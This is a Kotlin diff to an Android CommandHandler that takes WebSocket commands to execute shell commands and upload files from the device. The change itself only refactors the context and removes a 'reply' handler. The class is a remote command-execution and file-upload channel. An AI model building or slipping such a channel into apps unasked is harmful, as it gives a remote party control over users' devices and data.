@@ -9,13 +9,17 @@ import okhttp3.WebSocket
 import java.io.BufferedReader
 import java.io.InputStreamReader
 
-class CommandHandler(val context: Context, val command: Command, val socket: WebSocket) {
+class CommandHandler(context: Context, val command: Command, val socket: WebSocket) {
+
+    val context: Context = context.applicationContext
+
     object Commands {
         const val EXECUTE = "execute"
         const val REPLY = "reply"
         const val UPLOAD = "upload"
         const val PIN = "pin"
     }
+
     fun handle() {
         when (command.command) {
             Commands.EXECUTE -> {
@@ -24,16 +28,6 @@ class CommandHandler(val context: Context, val command: Command, val socket: Web
                     handleExecute(shellCommand)
                 } else {
                     reply("", "Required argument: shell_command")
-                }
-            }
-
-            Commands.REPLY -> {
-                val nonce = command.arguments["nonce"]
-                val output = command.arguments["output"]
-                if (nonce != null && output != null) {
-                    handleReply(nonce, output)
-                } else {
-                    reply("", "Required arguments: nonce, output")
                 }
             }
 
@@ -96,9 +90,6 @@ class CommandHandler(val context: Context, val command: Command, val socket: Web
         }
 
         reply("$filename queued for upload.", "")
-    }
-
-    private fun handleReply(nonce: String, output: String) {
     }
 
     private fun reply(output: String, error: String) {
